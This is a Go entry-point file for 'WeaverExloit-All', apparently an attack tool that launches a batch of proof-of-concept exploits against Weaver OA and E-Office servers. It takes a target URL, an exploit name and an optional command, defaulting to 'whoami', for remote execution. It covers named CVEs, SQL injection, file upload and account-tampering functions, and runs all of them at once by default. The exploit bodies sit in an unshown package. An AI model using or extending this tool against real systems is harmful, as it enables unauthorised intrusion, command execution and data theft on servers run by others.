package main

import (
	"awesomeProject/poc"
	"flag"
	"fmt"
)

func Banner() {
	banner := `
 __          __                             ______               _         _  _   
 \ \        / /                            |  ____|             | |       (_)| |  
  \ \  /\  / /___   __ _ __   __ ___  _ __ | |__   __  __ _ __  | |  ___   _ | |_ 
   \ \/  \/ // _ \ / _` + ` |\ \ / // _ \| '__||  __|  \ \/ /| '_ \ | | / _ \ | || __|
    \  /\  /|  __/| (_| | \ V /|  __/| |   | |____  >  < | |_) || || (_) || || |_
     \/  \/  \___| \__,_|  \_/  \___||_|   |______|/_/\_\| .__/ |_| \___/ |_| \__|
							 | |
							 |_|
							    	   by:Redus
`
	fmt.Println(banner)
}

func Help() {
	help := `
WeaverExloit-All.exe -u http://127.0.0.1:8080/
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p QVD-2023-5012
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p CVE-2023-2523
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p CVE-2023-2648
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p getloginid_ofsLogin
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p DeleteUserRequestInfoByXml
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p WorkFlowServiceXml
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p UploaderOperate
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p FileDownloadForOutDocSQL
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p E_Mobile_client  -c ipconfig
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p EOfficeVUl
WeaverExloit-All.exe -u http://127.0.0.1:8080/ -p EOfficeSQL
`
	fmt.Println(help)
}

func main() {
	url := flag.String("u", "", "指定目标")
	funcName := flag.String("p", "", "指定要执行的函数名称")
	command := flag.String("c", "whoami", "执行命令")
	flag.Parse()
	if *url == "" {
		Banner()
		Help()
	} else {
		switch *funcName {
		case "QVD-2023-5012":
			poc.CVE_2023_2523(*url)
		case "CVE-2023-2523":
			poc.CVE_2023_2523(*url)
		case "CVE-2023-2648":
			poc.CVE_2023_2648(*url)
		case "ChangeUserInfo":
			poc.ChangeUserInfo(*url)
		case "getloginid_ofsLogin":
			for i := 0; i < 10; i++ {
				poc.Getloginid(*url, "", i)
			}
		case "UploaderOperate":
			poc.UploaderOperate(*url)
		case "WorkFlowServiceXml":
			poc.WorkFlowServiceXml(*url)
		case "DeleteUserRequestInfoByXml":
			poc.DeleteUserRequestInfoByXml(*url)
		case "FileDownloadForOutDocSQL":
			poc.FileDownloadForOutDocSQL(*url)
		case "E_Mobile_client":
			poc.E_Mobile_client(*url, *command)
		case "EOfficeVUl":
			poc.EOfficeVUl(*url)
		case "LoginSSO":
			poc.LoginSSO(*url)
		case "EOfficeSQL":
			for _, path := range poc.EofficeSQLpaths {
				poc.EOfficeSQL(*url, path)
			}
		default:
			poc.ChangeUserInfo(*url)
			poc.QVD_2023_5012(*url)
			poc.CVE_2023_2523(*url)
			poc.CVE_2023_2648(*url)
			poc.WorkFlowServiceXml(*url)
			poc.UploaderOperate(*url)
			poc.DeleteUserRequestInfoByXml(*url)
			poc.FileDownloadForOutDocSQL(*url)
			poc.E_Mobile_client(*url, *command)
			poc.EOfficeVUl(*url)
			poc.LoginSSO(*url)
			for _, path := range poc.EofficeSQLpaths {
				poc.EOfficeSQL(*url, path)
			}

		}
	}

}
